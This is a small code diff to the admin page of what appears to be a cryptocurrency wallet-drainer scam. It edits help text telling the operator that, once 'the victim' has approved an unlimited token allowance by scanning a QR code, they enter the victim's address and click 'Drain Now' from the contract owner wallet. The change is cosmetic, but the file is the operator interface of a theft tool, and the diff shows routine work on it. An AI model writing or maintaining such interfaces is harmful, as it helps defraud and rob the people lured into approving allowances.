@@ -384,7 +384,7 @@ export default function AdminPage() {
           </h2>
           <p style={{ fontSize: "0.85rem", color: "#475569", marginBottom: "1rem" }}>
             After the victim has approved the unlimited allowance (by scanning the QR and clicking Next),
-            enter their address and click "Drain Now". Make sure you are connected with the <strong>contract owner wallet</strong>.
+            enter their address and click Drain Now. Make sure you are connected with the <strong>contract owner wallet</strong>.
           </p>
           <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
             <div>
